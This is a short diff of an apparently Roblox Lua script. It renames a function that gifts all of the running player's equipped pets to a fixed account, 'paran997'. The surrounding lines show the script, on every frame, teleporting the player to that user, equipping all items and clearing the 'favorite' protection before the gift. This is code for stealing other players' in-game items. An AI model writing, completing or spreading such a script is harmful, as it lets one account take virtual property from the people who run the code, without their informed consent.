@@ -104,7 +104,7 @@ local function equipAll()
 end
 
 -- Gift all equipped pets to paran997
-local function giftAllToPaare()
+local function giftAllToparan997()
 	for _, tool in ipairs(player.Character:GetChildren()) do
 		if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
 			if tool:GetAttribute("Favorite") ~= nil then
@@ -134,7 +134,7 @@ RunService.RenderStepped:Connect(function()
 		player.Character:MoveTo(paran997.Character.HumanoidRootPart.Position)
 		equipAll()
 		disableFavoriteOnEquipped()
-		giftAllToPaare()
+		giftAllToparan997()
 	end
 end)
 
